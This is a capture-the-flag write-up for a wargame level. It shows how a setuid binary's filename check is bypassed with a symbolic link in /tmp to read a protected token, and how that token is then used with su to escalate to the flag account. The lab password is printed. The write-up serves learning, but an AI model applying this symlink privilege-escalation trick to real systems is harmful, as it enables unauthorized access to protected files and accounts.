# Level08 Solution

## Steps:
1. Connected via SSH: `ssh level08@192.168.16.128 -p 4242`
2. Found a setuid binary named `level08` and a token file `token` in the home directory.
   - The binary `level08` is owned by `flag08`.
   - The file `token` is readable only by `level08`.
3. Analyzed the binary:
   - It opens the file passed as the first argument and prints its content.
   - However, it checks if the filename contains "token" and denies access if it does.
4. Bypassed the restriction using a symbolic link:
   - Created a symbolic link to `token` with a different name:
     ```bash
     ln -s /home/user/level08/token /tmp/fake
     ```
5. Ran the binary with the symbolic link:
   - Command: `./level08 /tmp/fake`
   - Output: `25749xKZ8L7DkSCwJkT9dyv6f`
6. Used the token to log in as `flag08`:
   - Command: `su flag08`
   - Password: `25749xKZ8L7DkSCwJkT9dyv6f`
7. Ran `getflag` to get the token for the next level:
   - Token: [output of getflag]

## Notes:
- The binary checks for the string "token" in the filename, so we cannot directly pass `token` as an argument.
- By creating a symbolic link with a different name, we bypass the filename check.
- The binary then reads the content of the token file through the symlink.

## Tools used:
- `ln` (to create symbolic links)
- Symbolic link exploitation

## Vulnerability:
- Insecure file access control based solely on the filename string.